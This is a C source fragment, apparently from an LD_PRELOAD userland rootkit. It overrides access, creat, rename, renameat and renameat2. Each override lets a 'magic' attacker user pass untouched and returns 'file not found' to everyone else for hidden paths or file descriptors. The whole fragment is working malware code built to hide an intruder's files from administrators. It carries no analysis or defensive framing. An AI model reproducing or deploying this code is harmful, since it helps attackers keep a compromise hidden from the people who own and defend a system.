int access(const char *pathname, int amode){
    hook(CACCESS);
    if(magicusr()) return (long)call(CACCESS, pathname, amode);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CACCESS, pathname, amode);
}

int creat(const char *pathname, mode_t mode){
    hook(CCREAT);
    if(magicusr()) return (long)call(CCREAT, pathname, mode);
    if(hidden_path(pathname)) { errno = ENOENT; return -1; }
    return (long)call(CCREAT, pathname, mode);
}

int rename(const char *oldpath, const char *newpath){
    hook(CRENAME);
    if(magicusr()) return (long)call(CRENAME, oldpath, newpath);
    if(hidden_path(oldpath) || hidden_path(newpath)) { errno = ENOENT; return -1; }
    return (long)call(CRENAME, oldpath, newpath);
}

int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath){
    hook(CRENAMEAT);
    if(magicusr()) return (long)call(CRENAMEAT, olddirfd, oldpath, newdirfd, newpath);
    if(hidden_path(oldpath) || hidden_path(newpath)) { errno = ENOENT; return -1; }
    if(hidden_fd(olddirfd) || hidden_fd(newdirfd)) { errno = ENOENT; return -1; }
    return (long)call(CRENAMEAT, olddirfd, oldpath, newdirfd, newpath);
}

int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, unsigned int flags){
    hook(CRENAMEAT2);
    if(magicusr()) return (long)call(CRENAMEAT2, olddirfd, oldpath, newdirfd, newpath, flags);
    if(hidden_path(oldpath) || hidden_path(newpath)) { errno = ENOENT; return -1; }
    if(hidden_fd(olddirfd) || hidden_fd(newdirfd)) { errno = ENOENT; return -1; }
    return (long)call(CRENAMEAT2, olddirfd, oldpath, newdirfd, newpath, flags);
}